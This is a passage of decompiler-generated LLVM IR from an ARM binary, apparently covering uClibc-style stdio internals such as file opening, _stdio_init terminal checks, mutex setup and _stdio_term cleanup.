  store i32 %v2_10ddc, i32* %r3.global-to-local, align 4
  %v9_10de0 = icmp eq i32 %v2_10ddc, %v1_10dd4
  store i1 %v9_10de0, i1* %cpsr_z.global-to-local, align 1
  %v1_10de4 = load i32, i32* @r8, align 4
  %v2_10de4 = add i32 %v1_10de4, 4
  %v3_10de4 = inttoptr i32 %v2_10de4 to i32*
  store i32 %v0_10e1c, i32* %v3_10de4, align 4
  br i1 %v9_10de0, label %dec_label_pc_10dec, label %dec_label_pc_10d40

dec_label_pc_10dec:                               ; preds = %dec_label_pc_10dcc
  %v0_10dec = load i32, i32* @r4, align 4
  %v1_10dec = load i32, i32* @r6, align 4
  %v2_10dec = sub i32 -1, %v1_10dec
  %v3_10dec = and i32 %v0_10dec, %v2_10dec
  store i32 %v3_10dec, i32* %r3.global-to-local, align 4
  %v1_10df0 = and i32 %v3_10dec, 1024
  %v2_10df0 = icmp eq i32 %v1_10df0, 0
  store i1 %v2_10df0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10df0, label %dec_label_pc_10e10, label %dec_label_pc_10df8

dec_label_pc_10df8:                               ; preds = %dec_label_pc_10dec
  %v0_10df8 = load i32, i32* @r5, align 4
  store i32 %v0_10df8, i32* @r0, align 4
  store i32 4, i32* %r1.global-to-local, align 4
  store i32 1024, i32* %r2.global-to-local, align 4
  %v2_10e04 = call i32 @__libc_fcntl(i32 %v0_10df8, i32 4)
  store i32 %v2_10e04, i32* %r0.global-to-local, align 4
  %v2_10e08 = icmp eq i32 %v2_10e04, 0
  store i1 %v2_10e08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10e08, label %dec_label_pc_10df8.dec_label_pc_10e10_crit_edge, label %dec_label_pc_10d40

dec_label_pc_10df8.dec_label_pc_10e10_crit_edge:  ; preds = %dec_label_pc_10df8
  %v0_10e10.pre = load i32, i32* @r6, align 4
  %v0_10e14.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_10e10

dec_label_pc_10e10:                               ; preds = %dec_label_pc_10df8.dec_label_pc_10e10_crit_edge, %dec_label_pc_10dec
  %v0_10e14 = phi i32 [ %v0_10e14.pre, %dec_label_pc_10df8.dec_label_pc_10e10_crit_edge ], [ %v0_10dec, %dec_label_pc_10dec ]
  %v0_10e10 = phi i32 [ %v0_10e10.pre, %dec_label_pc_10df8.dec_label_pc_10e10_crit_edge ], [ %v1_10dec, %dec_label_pc_10dec ]
  %v1_10e10 = and i32 %v0_10e10, 131072
  store i32 %v1_10e10, i32* %r3.global-to-local, align 4
  %v2_10e14 = or i32 %v1_10e10, %v0_10e14
  store i32 %v2_10e14, i32* @r4, align 4
  br label %dec_label_pc_10e40

dec_label_pc_10e1c:                               ; preds = %dec_label_pc_10dc4
  %v7_10e1c = icmp eq i32 %v0_10e1c, -1
  store i1 %v7_10e1c, i1* %cpsr_z.global-to-local, align 1
  %v0_10e28.pre = load i32, i32* @r4, align 4
  br i1 %v7_10e1c, label %dec_label_pc_10e1c._crit_edge, label %bb34

bb34:                                             ; preds = %dec_label_pc_10e1c
  %v2_10e20 = or i32 %v0_10e28.pre, 131072
  store i32 %v2_10e20, i32* @r4, align 4
  br label %dec_label_pc_10e1c._crit_edge

dec_label_pc_10e1c._crit_edge:                    ; preds = %dec_label_pc_10e1c, %bb34
  %v0_10e28 = phi i32 [ %v2_10e20, %bb34 ], [ %v0_10e28.pre, %dec_label_pc_10e1c ]
  %v0_10e24 = load i32, i32* @r6, align 4
  store i32 %v0_10e24, i32* @r0, align 4
  store i32 %v0_10e28, i32* %r1.global-to-local, align 4
  store i32 438, i32* %r2.global-to-local, align 4
  %v2_10e30 = call i32 @__libc_open(i32 %v0_10e24, i32 %v0_10e28)
  store i32 %v2_10e30, i32* %r0.global-to-local, align 4
  %v1_10e34 = icmp slt i32 %v2_10e30, 0
  %v2_10e34 = icmp eq i32 %v2_10e30, 0
  store i1 %v2_10e34, i1* %cpsr_z.global-to-local, align 1
  %v1_10e38 = load i32, i32* @r8, align 4
  %v2_10e38 = add i32 %v1_10e38, 4
  %v3_10e38 = inttoptr i32 %v2_10e38 to i32*
  store i32 %v2_10e30, i32* %v3_10e38, align 4
  br i1 %v1_10e34, label %dec_label_pc_10d54, label %dec_label_pc_10e40

dec_label_pc_10e40:                               ; preds = %dec_label_pc_10e1c._crit_edge, %dec_label_pc_10e10
  %v0_10e40 = load i32, i32* @r8, align 4
  %v1_10e40 = inttoptr i32 %v0_10e40 to i32*
  %v2_10e40 = load i32, i32* %v1_10e40, align 4
  %v1_10e44 = and i32 %v2_10e40, 8192
  store i32 %v1_10e44, i32* %r3.global-to-local, align 4
  %v3_10e481 = udiv i32 %v1_10e44, 256
  store i32 %v3_10e481, i32* %r2.global-to-local, align 4
  %v1_10e4c = trunc i32 %v3_10e481 to i8
  %v3_10e4c = add i32 %v0_10e40, 1
  %v4_10e4c = inttoptr i32 %v3_10e4c to i8*
  store i8 %v1_10e4c, i8* %v4_10e4c, align 1
  %v0_10e50 = load i32, i32* %r3.global-to-local, align 4
  %v1_10e50 = trunc i32 %v0_10e50 to i8
  %v2_10e50 = load i32, i32* @r8, align 4
  %v3_10e50 = inttoptr i32 %v2_10e50 to i8*
  store i8 %v1_10e50, i8* %v3_10e50, align 1
  %v0_10e54 = load i32, i32* @r4, align 4
  %v1_10e54 = and i32 %v0_10e54, 131072
  store i32 %v1_10e54, i32* %r1.global-to-local, align 4
  %v2_10e54 = icmp eq i32 %v1_10e54, 0
  store i1 %v2_10e54, i1* %cpsr_z.global-to-local, align 1
  %v0_10e58 = load i32, i32* @r8, align 4
  %v1_10e58 = add i32 %v0_10e58, 1
  %v2_10e58 = inttoptr i32 %v1_10e58 to i8*
  %v3_10e58 = load i8, i8* %v2_10e58, align 1
  %v4_10e58 = zext i8 %v3_10e58 to i32
  %v1_10e5c = inttoptr i32 %v0_10e58 to i8*
  %v2_10e5c = load i8, i8* %v1_10e5c, align 1
  %v3_10e5c = zext i8 %v2_10e5c to i32
  store i32 %v3_10e5c, i32* %r3.global-to-local, align 4
  br i1 %v2_10e54, label %bb36, label %bb35

bb35:                                             ; preds = %dec_label_pc_10e40
  store i32 32768, i32* %r1.global-to-local, align 4
  br label %bb36

bb36:                                             ; preds = %dec_label_pc_10e40, %bb35
  %v0_10e70 = phi i32 [ 0, %dec_label_pc_10e40 ], [ 32768, %bb35 ]
  %v1_10e64 = and i32 %v0_10e54, 1024
  store i32 %v1_10e64, i32* %r0.global-to-local, align 4
  %v4_10e6c = mul nuw nsw i32 %v4_10e58, 256
  %v5_10e6c = or i32 %v3_10e5c, %v4_10e6c
  %v2_10e70 = or i32 %v0_10e70, %v1_10e64
  store i32 %v2_10e70, i32* %r1.global-to-local, align 4
  %v2_10e78 = or i32 %v5_10e6c, %v2_10e70
  %v1_10e68 = mul i32 %v0_10e54, 16
  %v1_10e74 = and i32 %v1_10e68, 48
  %v1_10e7c = add nuw nsw i32 %v1_10e74, 16
  %v4_10e80 = xor i32 %v1_10e7c, 48
  %v5_10e80 = or i32 %v2_10e78, %v4_10e80
  store i32 %v5_10e80, i32* %r3.global-to-local, align 4
  %v3_10e8419 = udiv i32 %v2_10e78, 256
  store i32 %v3_10e8419, i32* %r2.global-to-local, align 4
  %v1_10e88 = trunc i32 %v3_10e8419 to i8
  store i8 %v1_10e88, i8* %v2_10e58, align 1
  %v0_10e8c = load i32, i32* %r3.global-to-local, align 4
  %v1_10e8c = trunc i32 %v0_10e8c to i8
  %v2_10e8c = load i32, i32* @r8, align 4
  %v3_10e8c = inttoptr i32 %v2_10e8c to i8*
  store i8 %v1_10e8c, i8* %v3_10e8c, align 1
  %v0_10e90 = call i32 @__errno_location()
  store i32 %v0_10e90, i32* %r0.global-to-local, align 4
  %v0_10e94 = load i32, i32* @r8, align 4
  %v1_10e94 = add i32 %v0_10e94, 1
  %v2_10e94 = inttoptr i32 %v1_10e94 to i8*
  %v3_10e94 = load i8, i8* %v2_10e94, align 1
  %v4_10e94 = zext i8 %v3_10e94 to i32
  store i32 %v4_10e94, i32* %r3.global-to-local, align 4
  %v1_10e98 = inttoptr i32 %v0_10e94 to i8*
  %v2_10e98 = load i8, i8* %v1_10e98, align 1
  %v3_10e98 = zext i8 %v2_10e98 to i32
  store i32 %v0_10e90, i32* @r6, align 4
  %v1_10ea0 = add i32 %v0_10e94, 4
  %v2_10ea0 = inttoptr i32 %v1_10ea0 to i32*
  %v3_10ea0 = load i32, i32* %v2_10ea0, align 4
  store i32 %v3_10ea0, i32* @r0, align 4
  %v4_10ea4 = mul nuw nsw i32 %v4_10e94, 256
  %v5_10ea4 = or i32 %v3_10e98, %v4_10ea4
  store i32 %v5_10ea4, i32* @r4, align 4
  %v1_10ea8 = inttoptr i32 %v0_10e90 to i32*
  %v2_10ea8 = load i32, i32* %v1_10ea8, align 4
  store i32 %v2_10ea8, i32* @r5, align 4
  %v1_10eac = call i32 @isatty(i32 %v3_10ea0)
  store i32 %v1_10eac, i32* %r0.global-to-local, align 4
  %v0_10eb0 = load i32, i32* @r4, align 4
  %v4_10eb0 = mul i32 %v1_10eac, 256
  %v5_10eb0 = or i32 %v0_10eb0, %v4_10eb0
  store i32 %v5_10eb0, i32* @r4, align 4
  %v3_10eb4 = sdiv i32 %v5_10eb0, 256
  store i32 %v3_10eb4, i32* %r3.global-to-local, align 4
  %v1_10eb8 = trunc i32 %v3_10eb4 to i8
  %v2_10eb8 = load i32, i32* @r8, align 4
  %v3_10eb8 = add i32 %v2_10eb8, 1
  %v4_10eb8 = inttoptr i32 %v3_10eb8 to i8*
  store i8 %v1_10eb8, i8* %v4_10eb8, align 1
  %v0_10ebc = load i32, i32* @r4, align 4
  %v1_10ebc = trunc i32 %v0_10ebc to i8
  %v2_10ebc = load i32, i32* @r8, align 4
  %v3_10ebc = inttoptr i32 %v2_10ebc to i8*
  store i8 %v1_10ebc, i8* %v3_10ebc, align 1
  %v0_10ec0 = load i32, i32* @r5, align 4
  %v1_10ec0 = load i32, i32* @r6, align 4
  %v2_10ec0 = inttoptr i32 %v1_10ec0 to i32*
  store i32 %v0_10ec0, i32* %v2_10ec0, align 4
  %v0_10ec4 = load i32, i32* @r8, align 4
  %v1_10ec4 = add i32 %v0_10ec4, 8
  %v2_10ec4 = inttoptr i32 %v1_10ec4 to i32*
  %v3_10ec4 = load i32, i32* %v2_10ec4, align 4
  store i32 %v3_10ec4, i32* %r3.global-to-local, align 4
  %v2_10ec8 = icmp eq i32 %v3_10ec4, 0
  store i1 %v2_10ec8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_10ec8, label %dec_label_pc_10ed0, label %bb37

dec_label_pc_10ed0:                               ; preds = %bb36
  store i32 4096, i32* %r0.global-to-local, align 4
  %v1_10ed4 = call i32 @malloc(i32 4096)
  store i32 %v1_10ed4, i32* %r0.global-to-local, align 4
  %v2_10ed8 = icmp eq i32 %v1_10ed4, 0
  store i1 %v2_10ed8, i1* %cpsr_z.global-to-local, align 1
  %v1_10eec.pre = load i32, i32* @r8, align 4
  br i1 %v2_10ed8, label %.thread7.thread, label %.thread8

.thread7.thread:                                  ; preds = %dec_label_pc_10ed0
  %v2_10eec20 = add i32 %v1_10eec.pre, 8
  %v3_10eec21 = inttoptr i32 %v2_10eec20 to i32*
  store i32 0, i32* %v3_10eec21, align 4
  br label %.thread10

.thread8:                                         ; preds = %dec_label_pc_10ed0
  %v2_10edc = inttoptr i32 %v1_10eec.pre to i32*
  %v3_10edc = load i32, i32* %v2_10edc, align 4
  %v2_10ee0 = or i32 %v3_10edc, 16384
  store i32 %v2_10ee0, i32* %r3.global-to-local, align 4
  %v2_10ee4 = add i32 %v1_10ed4, 4096
  store i32 %v2_10ee4, i32* %r2.global-to-local, align 4
  %v4_10ee8 = sdiv i32 %v2_10ee0, 256
  store i32 %v4_10ee8, i32* %r1.global-to-local, align 4
  %v2_10eec = add i32 %v1_10eec.pre, 8
  %v3_10eec = inttoptr i32 %v2_10eec to i32*
  store i32 %v1_10ed4, i32* %v3_10eec, align 4
  %v1_10ef0 = load i32, i32* %r2.global-to-local, align 4
  %v2_10ef0 = load i32, i32* @r8, align 4
  %v3_10ef0 = add i32 %v2_10ef0, 12
  %v4_10ef0 = inttoptr i32 %v3_10ef0 to i32*
  store i32 %v1_10ef0, i32* %v4_10ef0, align 4
  %v1_10ef4 = load i32, i32* %r1.global-to-local, align 4
  %v2_10ef4 = trunc i32 %v1_10ef4 to i8
  %v3_10ef4 = load i32, i32* @r8, align 4
  %v4_10ef4 = add i32 %v3_10ef4, 1
  %v5_10ef4 = inttoptr i32 %v4_10ef4 to i8*
  store i8 %v2_10ef4, i8* %v5_10ef4, align 1
  %v0_10ef8.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10ef8.pr.pr, label %.thread10, label %.thread9

.thread9:                                         ; preds = %.thread8
  %v1_10ef8 = load i32, i32* %r3.global-to-local, align 4
  %v2_10ef8 = trunc i32 %v1_10ef8 to i8
  %v3_10ef8 = load i32, i32* @r8, align 4
  %v4_10ef8 = inttoptr i32 %v3_10ef8 to i8*
  store i8 %v2_10ef8, i8* %v4_10ef8, align 1
  %v0_10efc.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_10efc.pr.pr, label %.thread10, label %bb37

.thread10:                                        ; preds = %.thread7.thread, %.thread8, %.thread9
  %v2_10efc = load i32, i32* @r8, align 4
  %v3_10efc = add i32 %v2_10efc, 12
  %v4_10efc = inttoptr i32 %v3_10efc to i32*
  store i32 %v1_10ed4, i32* %v4_10efc, align 4
  br label %bb37

bb37:                                             ; preds = %bb36, %.thread9, %.thread10
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2b5b0.389 to i32), i32* %r3.global-to-local, align 4
  %v2_10f08 = load i32, i32* @r8, align 4
  %v3_10f08 = add i32 %v2_10f08, 2
  %v4_10f08 = inttoptr i32 %v3_10f08 to i8*
  store i8 0, i8* %v4_10f08, align 1
  %v0_10f0c = load i32, i32* @r8, align 4
  %v1_10f0c = add i32 %v0_10f0c, 1
  %v2_10f0c = inttoptr i32 %v1_10f0c to i8*
  %v3_10f0c = load i8, i8* %v2_10f0c, align 1
  %v4_10f0c = zext i8 %v3_10f0c to i32
  store i32 %v4_10f0c, i32* %r2.global-to-local, align 4
  %v2_10f10 = load i32, i32* @global_var_2b5b0.389, align 4
  store i32 %v2_10f10, i32* %r1.global-to-local, align 4
  %v1_10f14 = add i32 %v0_10f0c, 8
  %v2_10f14 = inttoptr i32 %v1_10f14 to i32*
  %v3_10f14 = load i32, i32* %v2_10f14, align 4
  store i32 %v3_10f14, i32* %r3.global-to-local, align 4
  %v1_10f18 = and i32 %v4_10f0c, 32
  %v2_10f18 = icmp eq i32 %v1_10f18, 0
  store i1 %v2_10f18, i1* %cpsr_z.global-to-local, align 1
  %v2_10f1c = add i32 %v0_10f0c, 20
  %v3_10f1c = inttoptr i32 %v2_10f1c to i32*
  store i32 %v3_10f14, i32* %v3_10f1c, align 4
  %v0_10f20 = load i32, i32* %r0.global-to-local, align 4
  %v1_10f20 = load i32, i32* @r8, align 4
  %v2_10f20 = add i32 %v1_10f20, 44
  %v3_10f20 = inttoptr i32 %v2_10f20 to i32*
  store i32 %v0_10f20, i32* %v3_10f20, align 4
  %v0_10f24 = load i32, i32* %r1.global-to-local, align 4
  %v1_10f24 = load i32, i32* @r8, align 4
  %v2_10f24 = add i32 %v1_10f24, 52
  %v3_10f24 = inttoptr i32 %v2_10f24 to i32*
  store i32 %v0_10f24, i32* %v3_10f24, align 4
  %v0_10f28 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f28 = load i32, i32* @r8, align 4
  %v2_10f28 = add i32 %v1_10f28, 24
  %v3_10f28 = inttoptr i32 %v2_10f28 to i32*
  store i32 %v0_10f28, i32* %v3_10f28, align 4
  %v0_10f2c = load i32, i32* %r3.global-to-local, align 4
  %v1_10f2c = load i32, i32* @r8, align 4
  %v2_10f2c = add i32 %v1_10f2c, 28
  %v3_10f2c = inttoptr i32 %v2_10f2c to i32*
  store i32 %v0_10f2c, i32* %v3_10f2c, align 4
  %v0_10f30 = load i32, i32* %r3.global-to-local, align 4
  %v1_10f30 = load i32, i32* @r8, align 4
  %v2_10f30 = add i32 %v1_10f30, 16
  %v3_10f30 = inttoptr i32 %v2_10f30 to i32*
  store i32 %v0_10f30, i32* %v3_10f30, align 4
  br i1 %v2_10f18, label %dec_label_pc_10fc4, label %dec_label_pc_10f38

dec_label_pc_10f38:                               ; preds = %bb37
  %v2_10f38 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10f38, i32* @r7, align 4
  store i32 %v2_10f38, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r2, align 4
  store i32 58060, i32* @r4, align 4
  %v1_10f50 = call i32 @__pthread_cleanup_push_defer()
  store i32 62768, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* %r0.global-to-local, align 4
  %v2_10f60 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b598.559 to i32))
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* @r2, align 4
  store i32 %v2_10d14, i32* @r0, align 4
  store i32 ptrtoint (i8* @global_var_f360.275 to i32), i32* @r1, align 4
  %v1_10f74 = call i32 @__pthread_cleanup_push_defer()
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* %r0.global-to-local, align 4
  %v2_10f80 = call i32 @pthread_mutex_lock(i32 ptrtoint (i32* @global_var_2b580.577 to i32))
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r2.global-to-local, align 4
  %v2_10f88 = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %v2_10f88, i32* %r3.global-to-local, align 4
  store i32 %v2_10d14, i32* @r0, align 4
  %v1_10f90 = load i32, i32* @r8, align 4
  %v2_10f90 = add i32 %v1_10f90, 32
  %v3_10f90 = inttoptr i32 %v2_10f90 to i32*
  store i32 %v2_10f88, i32* %v3_10f90, align 4
  store i32 1, i32* @r1, align 4
  store i32 58236, i32* @r4, align 4
  %v0_10f9c = load i32, i32* @r8, align 4
  %v1_10f9c = load i32, i32* %r2.global-to-local, align 4
  %v2_10f9c = inttoptr i32 %v1_10f9c to i32*
  store i32 %v0_10f9c, i32* %v2_10f9c, align 4
  store i32 69544, i32* @lr, align 4
  %v1_10fa4 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v2_10f38, i32* @r0, align 4
  store i32 1, i32* @r1, align 4
  store i32 69564, i32* @lr, align 4
  %v1_10fb8 = call i32 @__pthread_cleanup_pop_restore()
  store i32 %v1_10fb8, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10fc0:                               ; preds = %dec_label_pc_10d54, %dec_label_pc_10d40, %dec_label_pc_10d60
  store i32 0, i32* @r8, align 4
  br label %dec_label_pc_10fc4

dec_label_pc_10fc4:                               ; preds = %bb37, %dec_label_pc_10d98, %dec_label_pc_10f38, %dec_label_pc_10fc0
  %v0_10fc4 = load i32, i32* @r8, align 4
  store i32 %v0_10fc4, i32* %r0.global-to-local, align 4
  %v2_10fcc = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_10fcc, i32* @r4, align 4
  store i32 %v6_10d08, i32* @r5, align 4
  store i32 %v9_10d08, i32* @r6, align 4
  store i32 %v12_10d08, i32* @r7, align 4
  store i32 %v15_10d08, i32* @r8, align 4
  ret i32 %v0_10fc4

; uselistorder directives
  uselistorder i32 %v1_10eec.pre, { 1, 0, 2 }
  uselistorder i32 %v3_10eb4, { 1, 0 }
  uselistorder i32 %v3_10e481, { 1, 0 }
  uselistorder i32 %v0_10e28, { 1, 0 }
  uselistorder i1 %v7_10e1c, { 1, 0 }
  uselistorder i32 %v1_10dec, { 1, 0 }
  uselistorder i32 %v0_10dec, { 1, 0 }
  uselistorder i32 %v1_10dd4, { 1, 0, 2 }
  uselistorder i32 %v1_10d88, { 1, 0 }
  uselistorder i1 %v7_10d34, { 1, 0 }
  uselistorder i1 %v7_10d28, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 0, 23, 24 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 7, 6, 8, 10, 9, 11, 12, 13, 15, 14, 16, 17 }
  uselistorder i1* %cpsr_z.global-to-local, { 0, 2, 1, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20 }
  uselistorder i32 131072, { 1, 2, 3, 0 }
  uselistorder i8 98, { 1, 0 }
  uselistorder label %dec_label_pc_10fc4, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_10fc0, { 2, 0, 1 }
  uselistorder label %bb37, { 2, 1, 0 }
  uselistorder label %.thread10, { 2, 1, 0 }
  uselistorder label %bb36, { 1, 0 }
  uselistorder label %dec_label_pc_10e1c._crit_edge, { 1, 0 }
  uselistorder label %dec_label_pc_10dc4, { 1, 0 }
  uselistorder label %.thread4, { 1, 0 }
  uselistorder label %dec_label_pc_10d70, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10d40, { 1, 2, 0 }
}

define i32 @"$d.15"(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_10fd0:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i16* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_10fd0 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_10fd0, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_10fd0
  %v3_10fd8 = and i32 %arg4, %arg3
  store i32 %v3_10fd8, i32* %r0.global-to-local, align 4
  %v2_10fdc = trunc i32 %v3_10fd8 to i16
  %v4_10fdc = inttoptr i32 %v3_10fd8 to i16*
  store i16 %v2_10fdc, i16* %v4_10fdc, align 2
  %v5_10fdc = load i32, i32* @r6, align 4
  %v6_10fdc = load i32, i32* %r0.global-to-local, align 4
  %v7_10fdc = sub i32 %v6_10fdc, %v5_10fdc
  store i32 %v7_10fdc, i32* %r0.global-to-local, align 4
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_10fd0, %bb
  %v8_10fdc = phi i32 [ %tmp, %dec_label_pc_10fd0 ], [ %v7_10fdc, %bb ]
  ret i32 %v8_10fdc

; uselistorder directives
  uselistorder i32 %v3_10fd8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 1, 2, 3, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @_stdio_init() local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %v3_11000 = load i32, i32* @r4, align 4
  store i32 %v3_11000, i32* %stack_var_-24, align 4
  %v6_11000 = load i32, i32* @r5, align 4
  %v9_11000 = load i32, i32* @r6, align 4
  %v12_11000 = load i32, i32* @r7, align 4
  %v0_11004 = call i32 @__errno_location()
  store i32 ptrtoint (i8** @global_var_2b5b4.383 to i32), i32* @r4, align 4
  %v3_1100c = load i8, i8* @global_var_2b5b5.582, align 1
  %v4_1100c = zext i8 %v3_1100c to i32
  %v2_11010 = load i8, i8* bitcast (i8** @global_var_2b5b4.383 to i8*), align 4
  %v3_11010 = zext i8 %v2_11010 to i32
  store i32 %v0_11004, i32* @r7, align 4
  store i32 0, i32* @r0, align 4
  %v4_1101c = mul nuw nsw i32 %v4_1100c, 256
  %v5_1101c = or i32 %v3_11010, %v4_1101c
  store i32 %v5_1101c, i32* @r6, align 4
  %v1_11020 = inttoptr i32 %v0_11004 to i32*
  %v2_11020 = load i32, i32* %v1_11020, align 4
  store i32 %v2_11020, i32* %r8.global-to-local, align 4
  %v1_11024 = call i32 @isatty(i32 0)
  %v1_11028 = sub i32 1, %v1_11024
  %v0_1102c = load i32, i32* @r6, align 4
  %v4_1102c = mul i32 %v1_11028, 256
  %v5_1102c = xor i32 %v4_1102c, %v0_1102c
  %v3_11030 = load i8, i8* @global_var_2b605.583, align 1
  %v4_11030 = zext i8 %v3_11030 to i32
  %v3_11034 = load i8, i8* @global_var_2b604.553, align 1
  %v4_11034 = zext i8 %v3_11034 to i32
  %v3_11038 = sdiv i32 %v5_1102c, 256
  store i32 1, i32* @r0, align 4
  %v4_11040 = mul nuw nsw i32 %v4_11030, 256
  %v5_11040 = or i32 %v4_11034, %v4_11040
  store i32 %v5_11040, i32* @r5, align 4
  %v1_11044 = trunc i32 %v3_11038 to i8
  store i8 %v1_11044, i8* @global_var_2b5b5.582, align 1
  %v1_11048 = trunc i32 %v0_1102c to i8
  %v2_11048 = load i32, i32* @r4, align 4
  %v3_11048 = inttoptr i32 %v2_11048 to i8*
  store i8 %v1_11048, i8* %v3_11048, align 1
  %v1_1104c = call i32 @isatty(i32 1)
  %v1_11050 = sub i32 1, %v1_1104c
  %v0_11054 = load i32, i32* @r5, align 4
  %v4_11054 = mul i32 %v1_11050, 256
  %v5_11054 = xor i32 %v4_11054, %v0_11054
  store i32 %v5_11054, i32* %r5.global-to-local, align 4
  %v3_11058 = sdiv i32 %v5_11054, 256
  %v1_1105c = trunc i32 %v3_11058 to i8
  store i8 %v1_1105c, i8* @global_var_2b605.583, align 1
  %v0_11060 = load i32, i32* %r8.global-to-local, align 4
  %v1_11060 = load i32, i32* @r7, align 4
  %v2_11060 = inttoptr i32 %v1_11060 to i32*
  store i32 %v0_11060, i32* %v2_11060, align 4
  %v0_11064 = load i32, i32* %r5.global-to-local, align 4
  %v1_11064 = trunc i32 %v0_11064 to i8
  store i8 %v1_11064, i8* @global_var_2b604.553, align 1
  %v2_11068 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_11068, i32* @r4, align 4
  store i32 %v6_11000, i32* @r5, align 4
  store i32 %v9_11000, i32* @r6, align 4
  store i32 %v12_11000, i32* @r7, align 4
  ret i32 %v1_11050

; uselistorder directives
  uselistorder i32 %v1_11050, { 1, 0 }
  uselistorder i32 %v0_1102c, { 1, 0 }
  uselistorder i8* @global_var_2b604.553, { 1, 0 }
  uselistorder i8* @global_var_2b605.583, { 1, 0 }
  uselistorder i32 (i32)* @isatty, { 1, 0, 2 }
  uselistorder i8* @global_var_2b5b5.582, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_1d628.585 to i32), i32* @r1, align 4
  store i32 24, i32* @r2, align 4
  %v0_11078 = call i32 @memcpy()
  %v0_1107c = load i1, i1* @cpsr_z, align 1
  br i1 %v0_1107c, label %bb, label %bb1

bb:                                               ; preds = %entry
  br label %bb1

bb1:                                              ; preds = %entry, %bb
  ret i32 %v0_11078

; uselistorder directives
  uselistorder label %bb1, { 1, 0 }
}

define i32 @_stdio_term() local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11080 = load i32, i32* @r4, align 4
  store i32 %v3_11080, i32* %stack_var_-12, align 4
  store i32 ptrtoint (i32* @global_var_2b580.577 to i32), i32* @r0, align 4
  %v0_11088 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_2b598.559 to i32), i32* @r0, align 4
  %v0_11090 = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32** @global_var_2b57c.384 to i32), i32* %r3.global-to-local, align 4
  %storemerge5 = load i32, i32* bitcast (i32** @global_var_2b57c.384 to i32*), align 4
  store i32 %storemerge5, i32* @r4, align 4
  %v1_110ec6 = add i32 %storemerge5, 56
  store i32 %v1_110ec6, i32* @r5, align 4
  %v2_110f08 = icmp eq i32 %storemerge5, 0
  store i32 %v1_110ec6, i32* %r0.global-to-local, align 4
  br i1 %v2_110f08, label %dec_label_pc_110fc, label %dec_label_pc_110a0

dec_label_pc_110a0:                               ; preds = %entry, %dec_label_pc_110dc
  %v1_110a8 = phi i32 [ %v1_110ec, %dec_label_pc_110dc ], [ %v1_110ec6, %entry ]
  store i32 ptrtoint (i32* @global_var_f790.590 to i32), i32* %r3.global-to-local, align 4
  store i32 69804, i32* @lr, align 4
  %v2_110a8 = call i32 @pthread_mutex_trylock(i32 %v1_110a8)
  %v2_110ac = icmp eq i32 %v2_110a8, 0
  %v0_110b0 = load i32, i32* @r5, align 4
  store i32 %v0_110b0, i32* @r0, align 4
  br i1 %v2_110ac, label %dec_label_pc_110dc, label %dec_label_pc_110b8

dec_label_pc_110b8:                               ; preds = %dec_label_pc_110a0
  %v0_110b8 = load i32, i32* @r4, align 4
  %v1_110b8 = add i32 %v0_110b8, 8
  %v2_110b8 = inttoptr i32 %v1_110b8 to i32*
  %v3_110b8 = load i32, i32* %v2_110b8, align 4
  store i32 %v3_110b8, i32* %r3.global-to-local, align 4
  %v3_110c0 = inttoptr i32 %v0_110b8 to i8*
  store i8 48, i8* %v3_110c0, align 1
  %v2_110c8 = load i32, i32* @r4, align 4
  %v3_110c8 = add i32 %v2_110c8, 1
  %v4_110c8 = inttoptr i32 %v3_110c8 to i8*
  store i8 0, i8* %v4_110c8, align 1
  %v0_110cc = load i32, i32* %r3.global-to-local, align 4
  %v1_110cc = load i32, i32* @r4, align 4
  %v2_110cc = add i32 %v1_110cc, 20
  %v3_110cc = inttoptr i32 %v2_110cc to i32*
  store i32 %v0_110cc, i32* %v3_110cc, align 4
